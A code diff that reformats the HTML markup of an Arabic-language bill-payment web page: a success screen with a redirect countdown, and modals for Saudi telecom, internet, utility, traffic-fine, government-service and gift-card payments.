-        <div class="min-h-screen bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 flex items-center justify-center relative overflow-hidden">
-            <div class="absolute inset-0">
-                <div class="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-green-600/20 to-emerald-600/20 animate-pulse"></div>
-                <div class="absolute top-20 left-20 w-96 h-96 bg-gradient-to-r from-emerald-400/30 to-green-400/30 rounded-full blur-3xl animate-float"></div>
-                <div class="absolute bottom-20 right-20 w-72 h-72 bg-gradient-to-r from-teal-500/30 to-emerald-500/30 rounded-full blur-3xl animate-float" style="animation-delay: 2s;"></div>
-            </div>
-            
-            <div class="container mx-auto px-6 relative z-10">
-                <div class="max-w-3xl mx-auto text-center" data-aos="zoom-in">
-                    <div class="bg-white/10 backdrop-blur-md rounded-3xl p-12 border border-white/20 shadow-2xl">
-                        <div class="relative mb-12">
-                            <div class="w-32 h-32 bg-gradient-to-r from-emerald-400 to-green-400 rounded-full flex items-center justify-center mx-auto animate-bounce">
-                                <i class="fas fa-check text-white text-6xl"></i>
-                            </div>
-                            <div class="absolute inset-0 bg-gradient-to-r from-emerald-400 to-green-400 rounded-full animate-ping opacity-75"></div>
-                        </div>
-                        
-                        <h1 class="text-5xl font-bold text-white mb-6">تمت العملية بنجاح!</h1>
-                        <p class="text-2xl text-green-300 mb-12">شكراً لك، تم تأكيد طلبك وسيتم معالجته قريباً</p>
-                        
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
-                            <button onclick="goHome()" class="bg-gradient-to-r from-blue-500 to-indigo-600 text-white py-4 rounded-2xl font-bold hover:from-blue-400 hover:to-indigo-500 transition-all">
-                                <i class="fas fa-home ml-2"></i>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Success Page -->
+<div class="page" id="successPage">
+<div class="min-h-screen bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 flex items-center justify-center relative overflow-hidden">
+<div class="absolute inset-0">
+<div class="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-green-600/20 to-emerald-600/20 animate-pulse"></div>
+<div class="absolute top-20 left-20 w-96 h-96 bg-gradient-to-r from-emerald-400/30 to-green-400/30 rounded-full blur-3xl animate-float"></div>
+<div class="absolute bottom-20 right-20 w-72 h-72 bg-gradient-to-r from-teal-500/30 to-emerald-500/30 rounded-full blur-3xl animate-float" style="animation-delay: 2s;"></div>
+</div>
+<div class="container mx-auto px-6 relative z-10">
+<div class="max-w-3xl mx-auto text-center" data-aos="zoom-in">
+<div class="bg-white/10 backdrop-blur-md rounded-3xl p-12 border border-white/20 shadow-2xl">
+<div class="relative mb-12">
+<div class="w-32 h-32 bg-gradient-to-r from-emerald-400 to-green-400 rounded-full flex items-center justify-center mx-auto animate-bounce">
+<i class="fas fa-check text-white text-6xl"></i>
+</div>
+<div class="absolute inset-0 bg-gradient-to-r from-emerald-400 to-green-400 rounded-full animate-ping opacity-75"></div>
+</div>
+<h1 class="text-5xl font-bold text-white mb-6">تمت العملية بنجاح!</h1>
+<p class="text-2xl text-green-300 mb-12">شكراً لك، تم تأكيد طلبك وسيتم معالجته قريباً</p>
+<div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
+<button class="bg-gradient-to-r from-blue-500 to-indigo-600 text-white py-4 rounded-2xl font-bold hover:from-blue-400 hover:to-indigo-500 transition-all" onclick="goHome()">
+<i class="fas fa-home ml-2"></i>
                                 العودة للرئيسية
                             </button>
-                            <button onclick="shareSuccess()" class="bg-gradient-to-r from-purple-500 to-pink-600 text-white py-4 rounded-2xl font-bold hover:from-purple-400 hover:to-pink-500 transition-all">
-                                <i class="fas fa-share ml-2"></i>
+<button class="bg-gradient-to-r from-purple-500 to-pink-600 text-white py-4 rounded-2xl font-bold hover:from-purple-400 hover:to-pink-500 transition-all" onclick="shareSuccess()">
+<i class="fas fa-share ml-2"></i>
                                 مشاركة النجاح
                             </button>
-                        </div>
-                        
-                        <div class="text-center">
-                            <div class="text-white/80 mb-4">سيتم توجيهك للصفحة الرئيسية خلال</div>
-                            <div id="redirectCountdown" class="text-3xl font-bold text-yellow-400">10</div>
-                            <div class="text-sm text-white/60 mt-2">ثانية</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modals -->
-    <!-- Telecom Modal -->
-    <div id="telecomModal" class="modal">
-        <div class="modal-content w-full max-w-4xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">🚀 خدمات الاتصالات الذكية</h2>
-                <button onclick="closeModal('telecomModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="grid grid-cols-2 gap-6 mb-8">
-                <button onclick="selectServiceAndAmount('mobile', 'دفع فاتورة الجوال')" class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-file-invoice text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">دفع فاتورة الجوال</h3>
-                    <p class="text-gray-400">فاتورة شهرية لجميع الشركات</p>
-                </button>
-                <button onclick="selectServiceAndAmount('recharge', 'شحن رصيد الجوال')" class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group">
-                    <i class="fas fa-plus-circle text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">شحن رصيد الجوال</h3>
-                    <p class="text-gray-400">رصيد فوري لجميع الشبكات</p>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Internet Modal -->
-    <div id="internetModal" class="modal">
-        <div class="modal-content w-full max-w-4xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">🌐 فواتير الإنترنت</h2>
-                <button onclick="closeModal('internetModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة STC الإنترنت')" class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group">
-                    <i class="fas fa-wifi text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">STC الإنترنت</h3>
-                    <p class="text-gray-400">فايبر وDSL</p>
-                </button>
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة موبايلي الإنترنت')" class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group">
-                    <i class="fas fa-globe text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">موبايلي الإنترنت</h3>
-                    <p class="text-gray-400">براودباند وفايبر</p>
-                </button>
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة زين الإنترنت')" class="p-8 bg-gradient-to-br from-purple-600/20 to-purple-800/20 border-2 border-purple-500/30 rounded-2xl hover:border-purple-400 hover:bg-purple-600/30 transition-all text-center group">
-                    <i class="fas fa-satellite text-5xl text-purple-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">زين الإنترنت</h3>
-                    <p class="text-gray-400">5G وفايبر</p>
-                </button>
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة GO الإنترنت')" class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-rocket text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">GO الإنترنت</h3>
-                    <p class="text-gray-400">إنترنت منزلي سريع</p>
-                </button>
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة نور الإنترنت')" class="p-8 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group">
-                    <i class="fas fa-bolt text-5xl text-orange-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">نور الإنترنت</h3>
-                    <p class="text-gray-400">حلول الألياف البصرية</p>
-                </button>
-                <button onclick="selectServiceAndAmount('internet', 'فاتورة إنترنت أخرى')" class="p-8 bg-gradient-to-br from-gray-600/20 to-gray-800/20 border-2 border-gray-500/30 rounded-2xl hover:border-gray-400 hover:bg-gray-600/30 transition-all text-center group">
-                    <i class="fas fa-network-wired text-5xl text-gray-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">مزود آخر</h3>
-                    <p class="text-gray-400">مزودي إنترنت آخرين</p>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Utilities Modal -->
-    <div id="utilitiesModal" class="modal">
-        <div class="modal-content w-full max-w-4xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-green-400 to-yellow-400 bg-clip-text text-transparent">⚡ فواتير المرافق الذكية</h2>
-                <button onclick="closeModal('utilitiesModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
-                <button onclick="selectServiceAndAmount('electricity', 'فاتورة الكهرباء')" class="p-8 bg-gradient-to-br from-yellow-600/20 to-yellow-800/20 border-2 border-yellow-500/30 rounded-2xl hover:border-yellow-400 hover:bg-yellow-600/30 transition-all text-center group">
-                    <i class="fas fa-bolt text-5xl text-yellow-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">الكهرباء</h3>
-                    <p class="text-gray-400">الشركة السعودية للكهرباء</p>
-                </button>
-                <button onclick="selectServiceAndAmount('water', 'فاتورة الماء')" class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-tint text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">المياه</h3>
-                    <p class="text-gray-400">شركة المياه الوطنية</p>
-                </button>
-                <button onclick="selectServiceAndAmount('gas', 'فاتورة الغاز')" class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group">
-                    <i class="fas fa-fire text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">الغاز</h3>
-                    <p class="text-gray-400">شركة الغاز السعودية</p>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Violations Modal -->
-    <div id="violationsModal" class="modal">
-        <div class="modal-content w-full max-w-4xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-red-400 to-pink-400 bg-clip-text text-transparent">🚗 المخالفات المرورية الذكية</h2>
-                <button onclick="closeModal('violationsModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="text-center">
-                <button onclick="selectServiceAndAmount('violations', 'المخالفات المرورية')" class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all group">
-                    <i class="fas fa-car text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-xl mb-2">دفع المخالفات المرورية</h3>
-                    <p class="text-gray-400">حدد المبلغ المطلوب لدفع المخالفات</p>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Government Modal -->
-    <div id="governmentModal" class="modal">
-        <div class="modal-content w-full max-w-4xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">🏛️ الخدمات الحكومية</h2>
-                <button onclick="closeModal('governmentModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
-                <button onclick="selectServiceAndAmount('government', 'خدمات الجوازات')" class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-passport text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">الجوازات</h3>
-                </button>
-                <button onclick="selectServiceAndAmount('government', 'خدمات الأحوال المدنية')" class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group">
-                    <i class="fas fa-id-card text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">الأحوال المدنية</h3>
-                </button>
-                <button onclick="selectServiceAndAmount('government', 'خدمات وزارة العدل')" class="p-8 bg-gradient-to-br from-purple-600/20 to-purple-800/20 border-2 border-purple-500/30 rounded-2xl hover:border-purple-400 hover:bg-purple-600/30 transition-all text-center group">
-                    <i class="fas fa-gavel text-5xl text-purple-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">وزارة العدل</h3>
-                </button>
-                <button onclick="selectServiceAndAmount('government', 'خدمات وزارة العمل')" class="p-8 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group">
-                    <i class="fas fa-briefcase text-5xl text-orange-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">وزارة العمل</h3>
-                </button>
-                <button onclick="selectServiceAndAmount('government', 'خدمات وزارة الصحة')" class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group">
-                    <i class="fas fa-hospital text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">وزارة الصحة</h3>
-                </button>
-                <button onclick="selectServiceAndAmount('government', 'خدمات وزارة التعليم')" class="p-8 bg-gradient-to-br from-cyan-600/20 to-cyan-800/20 border-2 border-cyan-500/30 rounded-2xl hover:border-cyan-400 hover:bg-cyan-600/30 transition-all text-center group">
-                    <i class="fas fa-graduation-cap text-5xl text-cyan-400 mb-4 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">وزارة التعليم</h3>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Shopping Modal -->
-    <div id="shoppingModal" class="modal">
-        <div class="modal-content w-full max-w-5xl text-white">
-            <div class="flex items-center justify-between mb-8">
-                <h2 class="text-3xl font-bold bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">🛍️ التسوق والترفيه</h2>
-                <button onclick="closeModal('shoppingModal')" class="p-3 hover:bg-gray-700 rounded-lg transition-colors">
-                    <i class="fas fa-times text-xl text-gray-400"></i>
-                </button>
-            </div>
-            
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة نتفليكس')" class="p-6 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group">
-                    <i class="fas fa-play text-4xl text-red-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">نتفليكس</h3>
-                    <p class="text-gray-400 text-sm">اشتراكات المشاهدة</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة ستيم')" class="p-6 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-gamepad text-4xl text-blue-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">ستيم</h3>
-                    <p class="text-gray-400 text-sm">بطاقات الألعاب</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة آيتونز')" class="p-6 bg-gradient-to-br from-gray-600/20 to-gray-800/20 border-2 border-gray-500/30 rounded-2xl hover:border-gray-400 hover:bg-gray-600/30 transition-all text-center group">
-                    <i class="fab fa-apple text-4xl text-gray-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">آيتونز</h3>
-                    <p class="text-gray-400 text-sm">App Store &amp; iTunes</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة جوجل بلاي')" class="p-6 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group">
-                    <i class="fab fa-google-play text-4xl text-green-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">جوجل بلاي</h3>
-                    <p class="text-gray-400 text-sm">متجر جوجل</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة أمازون')" class="p-6 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group">
-                    <i class="fab fa-amazon text-4xl text-orange-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">أمازون</h3>
-                    <p class="text-gray-400 text-sm">تسوق أونلاين</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة كارفور')" class="p-6 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group">
-                    <i class="fas fa-shopping-cart text-4xl text-blue-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">كارفور</h3>
-                    <p class="text-gray-400 text-sm">هايبر ماركت</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة سبوتيفاي')" class="p-6 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group">
-                    <i class="fab fa-spotify text-4xl text-green-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">سبوتيفاي</h3>
-                    <p class="text-gray-400 text-sm">موسيقى وبودكاست</p>
-                </button>
-                <button onclick="selectServiceAndAmount('shopping', 'بطاقة يوتيوب بريميوم')" class="p-6 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group">
-                    <i class="fab fa-youtube text-4xl text-red-400 mb-3 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="font-bold text-lg mb-2">يوتيوب</h3>
-                    <p class="text-gray-400 text-sm">Premium &amp; Music</p>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script>
+</div>
+<div class="text-center">
+<div class="text-white/80 mb-4">سيتم توجيهك للصفحة الرئيسية خلال</div>
+<div class="text-3xl font-bold text-yellow-400" id="redirectCountdown">10</div>
+<div class="text-sm text-white/60 mt-2">ثانية</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Modals -->
+<!-- Telecom Modal -->
+<div class="modal" id="telecomModal">
+<div class="modal-content w-full max-w-4xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">🚀 خدمات الاتصالات الذكية</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('telecomModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="grid grid-cols-2 gap-6 mb-8">
+<button class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('mobile', 'دفع فاتورة الجوال')">
+<i class="fas fa-file-invoice text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">دفع فاتورة الجوال</h3>
+<p class="text-gray-400">فاتورة شهرية لجميع الشركات</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group" onclick="selectServiceAndAmount('recharge', 'شحن رصيد الجوال')">
+<i class="fas fa-plus-circle text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">شحن رصيد الجوال</h3>
+<p class="text-gray-400">رصيد فوري لجميع الشبكات</p>
+</button>
+</div>
+</div>
+</div>
+<!-- Internet Modal -->
+<div class="modal" id="internetModal">
+<div class="modal-content w-full max-w-4xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">🌐 فواتير الإنترنت</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('internetModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+<button class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة STC الإنترنت')">
+<i class="fas fa-wifi text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">STC الإنترنت</h3>
+<p class="text-gray-400">فايبر وDSL</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة موبايلي الإنترنت')">
+<i class="fas fa-globe text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">موبايلي الإنترنت</h3>
+<p class="text-gray-400">براودباند وفايبر</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-purple-600/20 to-purple-800/20 border-2 border-purple-500/30 rounded-2xl hover:border-purple-400 hover:bg-purple-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة زين الإنترنت')">
+<i class="fas fa-satellite text-5xl text-purple-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">زين الإنترنت</h3>
+<p class="text-gray-400">5G وفايبر</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة GO الإنترنت')">
+<i class="fas fa-rocket text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">GO الإنترنت</h3>
+<p class="text-gray-400">إنترنت منزلي سريع</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة نور الإنترنت')">
+<i class="fas fa-bolt text-5xl text-orange-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">نور الإنترنت</h3>
+<p class="text-gray-400">حلول الألياف البصرية</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-gray-600/20 to-gray-800/20 border-2 border-gray-500/30 rounded-2xl hover:border-gray-400 hover:bg-gray-600/30 transition-all text-center group" onclick="selectServiceAndAmount('internet', 'فاتورة إنترنت أخرى')">
+<i class="fas fa-network-wired text-5xl text-gray-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">مزود آخر</h3>
+<p class="text-gray-400">مزودي إنترنت آخرين</p>
+</button>
+</div>
+</div>
+</div>
+<!-- Utilities Modal -->
+<div class="modal" id="utilitiesModal">
+<div class="modal-content w-full max-w-4xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-green-400 to-yellow-400 bg-clip-text text-transparent">⚡ فواتير المرافق الذكية</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('utilitiesModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+<button class="p-8 bg-gradient-to-br from-yellow-600/20 to-yellow-800/20 border-2 border-yellow-500/30 rounded-2xl hover:border-yellow-400 hover:bg-yellow-600/30 transition-all text-center group" onclick="selectServiceAndAmount('electricity', 'فاتورة الكهرباء')">
+<i class="fas fa-bolt text-5xl text-yellow-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">الكهرباء</h3>
+<p class="text-gray-400">الشركة السعودية للكهرباء</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('water', 'فاتورة الماء')">
+<i class="fas fa-tint text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">المياه</h3>
+<p class="text-gray-400">شركة المياه الوطنية</p>
+</button>
+<button class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group" onclick="selectServiceAndAmount('gas', 'فاتورة الغاز')">
+<i class="fas fa-fire text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">الغاز</h3>
+<p class="text-gray-400">شركة الغاز السعودية</p>
+</button>
+</div>
+</div>
+</div>
+<!-- Violations Modal -->
+<div class="modal" id="violationsModal">
+<div class="modal-content w-full max-w-4xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-red-400 to-pink-400 bg-clip-text text-transparent">🚗 المخالفات المرورية الذكية</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('violationsModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="text-center">
+<button class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all group" onclick="selectServiceAndAmount('violations', 'المخالفات المرورية')">
+<i class="fas fa-car text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-xl mb-2">دفع المخالفات المرورية</h3>
+<p class="text-gray-400">حدد المبلغ المطلوب لدفع المخالفات</p>
+</button>
+</div>
+</div>
+</div>
+<!-- Government Modal -->
+<div class="modal" id="governmentModal">
+<div class="modal-content w-full max-w-4xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">🏛️ الخدمات الحكومية</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('governmentModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+<button class="p-8 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات الجوازات')">
+<i class="fas fa-passport text-5xl text-blue-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">الجوازات</h3>
+</button>
+<button class="p-8 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات الأحوال المدنية')">
+<i class="fas fa-id-card text-5xl text-green-400 mb-4 group-hover:scale-110 transition-transform"></i>
